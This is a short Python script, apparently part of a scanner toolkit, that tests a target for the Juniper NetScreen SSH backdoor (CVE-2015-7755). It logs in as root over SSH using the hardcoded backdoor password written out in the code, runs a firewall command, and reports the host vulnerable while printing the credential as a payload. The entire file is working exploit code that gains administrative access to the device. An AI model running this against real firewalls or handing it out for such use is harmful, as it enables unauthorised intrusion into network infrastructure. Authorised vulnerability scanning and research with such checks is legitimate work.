#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: juniper NetScreen防火墙后门(CVE-2015-7755)
referer: http://www.freebuf.com/news/90323.html
author: Lucifer
description: ssh后门。
'''
import sys
import warnings
from termcolor import cprint
from pexpect import pxssh
from urllib.parse import urlparse

class juniper_netscreen_backdoor_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        try:
            user = "root"
            password = "<<< %s(un='%s') = %u"
            port = 22
            s = pxssh.pxssh()
            s.login(host, user, password, port, auto_prompt_reset=False)
            s.sendline(b'Get int')
            s.prompt()
            if s.before.find(b'Interfaces')  is not -1:
                cprint("[+]存在juniper NetScreen防火墙后门(CVE-2015-7755)漏洞...(高危)\tpayload: "+host+" "+user+":"+password, "red")
    
            s.logout()

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = juniper_netscreen_backdoor_BaseVerify(sys.argv[1])
    testVuln.run()
